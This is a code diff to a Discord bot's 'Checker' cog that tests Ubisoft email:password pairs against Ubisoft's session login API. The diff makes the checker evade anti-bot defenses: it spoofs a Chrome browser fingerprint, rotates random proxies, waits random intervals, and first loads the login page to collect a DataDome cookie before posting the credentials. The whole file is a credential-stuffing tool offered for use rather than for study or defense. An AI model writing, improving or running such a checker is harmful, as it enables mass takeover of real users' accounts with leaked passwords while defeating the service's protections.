@@ -56,29 +56,33 @@ class Checker(commands.Cog):
         
         await asyncio.sleep(random.uniform(1.0, 2.0))
 
-        headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Ubi-AppId": UBI_APP_ID,
-            "Authorization": f"Basic {b64_auth}",
-            "Accept": "application/json",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://account.ubisoft.com",
-            "Referer": "https://account.ubisoft.com/",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-        }
-
         embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
         
         proxy = random.choice(self.proxies) if self.proxies else None
 
         try:
             def do_request():
-                return requests.post(
+                session = requests.Session(impersonate="chrome124")
+                if proxy:
+                    session.proxies = {"http": proxy, "https": proxy}
+
+                # Step 1: Get DataDome cookie
+                session.get("https://account.ubisoft.com/en-US/login", timeout=10)
+
+                # Step 2: Hit the API with the cookie
+                headers = {
+                    "Content-Type": "application/json",
+                    "Ubi-AppId": UBI_APP_ID,
+                    "Authorization": f"Basic {b64_auth}",
+                    "Origin": "https://account.ubisoft.com",
+                    "Referer": "https://account.ubisoft.com/en-US/login",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+                }
+                
+                return session.post(
                     "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                     headers=headers,
-                    data="rememberMe=true",
-                    impersonate="chrome124",
-                    proxy=proxy,
+                    json={"rememberMe": True},
                     timeout=15
                 )
 
@@ -196,27 +200,28 @@ class Checker(commands.Cog):
                 
                 email, password = creds.split(":", 1)
                 b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
-                
-                headers = {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Ubi-AppId": UBI_APP_ID,
-                    "Authorization": f"Basic {b64_auth}",
-                    "Accept": "application/json",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Origin": "https://account.ubisoft.com",
-                    "Referer": "https://account.ubisoft.com/",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-                }
-
                 proxy = random.choice(self.proxies) if self.proxies else None
                 
                 def do_req():
-                    return requests.post(
+                    session = requests.Session(impersonate="chrome124")
+                    if proxy:
+                        session.proxies = {"http": proxy, "https": proxy}
+
+                    session.get("https://account.ubisoft.com/en-US/login", timeout=10)
+
+                    headers = {
+                        "Content-Type": "application/json",
+                        "Ubi-AppId": UBI_APP_ID,
+                        "Authorization": f"Basic {b64_auth}",
+                        "Origin": "https://account.ubisoft.com",
+                        "Referer": "https://account.ubisoft.com/en-US/login",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+                    }
+                    
+                    return session.post(
                         "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                         headers=headers,
-                        data="rememberMe=true",
-                        impersonate="chrome124",
-                        proxy=proxy,
+                        json={"rememberMe": True},
                         timeout=15
                     )
 
